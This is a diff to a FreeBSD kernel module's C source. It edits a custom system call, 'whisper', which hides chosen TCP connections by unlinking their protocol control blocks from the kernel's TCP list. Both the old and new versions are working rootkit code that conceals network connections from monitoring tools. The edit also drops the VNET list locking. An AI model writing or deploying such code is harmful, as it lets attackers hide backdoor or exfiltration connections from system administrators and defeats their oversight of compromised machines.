@@ -24,21 +24,19 @@
 
 /* System call to hide an open TCP connection. */
 static int whisper(struct thread *td, void *syscall_args) {
-
    struct whisper_args *uap;
    uap = (struct whisper_args *)syscall_args;
-   struct inpcb *inpb;
+   struct inpcb     *inpb;
 #ifdef DEBUG
-   bool found = false;
    uprintf("[-] uap->lport = %u uap->fport = %u\n", uap->lport, uap->fport);
 #endif
-
-   VNET_LIST_RLOCK_NOSLEEP();
    CURVNET_SET(TD_TO_VNET(td));
-   struct inpcb_iterator inpi = INP_ALL_ITERATOR(&V_tcbinfo, INPLOOKUP_WLOCKPCB);
 
    /* Iterate through the TCP-based inpcb list. */
-   while ((inpb = inp_next(&inpi)) != NULL) {
+   CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_listhead, inp_list) {
+      if (inpb->inp_vflag & INP_TIMEWAIT) {
+         continue;
+      }
 
       // Do we want to hide this local open port that is
       // connected to this foreign port?
@@ -46,23 +44,15 @@ static int whisper(struct thread *td, void *syscall_args) {
             || (uap->lport == 0))
          && ((uap->fport == ntohs(inpb->inp_inc.inc_ie.ie_fport))
             || (uap->fport == 0))) {
-
          CK_LIST_REMOVE(inpb, inp_list);
 #ifdef DEBUG
-         found = true;
+         uprintf("[-] Hiding connection between local port ( %u ) and "
+            "foreign port ( %u )\n", uap->lport, uap->fport);
 #endif
       }
    }
 
    CURVNET_RESTORE();
-   VNET_LIST_RUNLOCK_NOSLEEP();
-
-#ifdef DEBUG
-   if (found) {
-      uprintf("[-] Hiding connection between local port ( %u ) and "
-         "foreign port ( %u )\n", uap->lport, uap->fport);
-   }
-#endif
 
    return (0);
 }
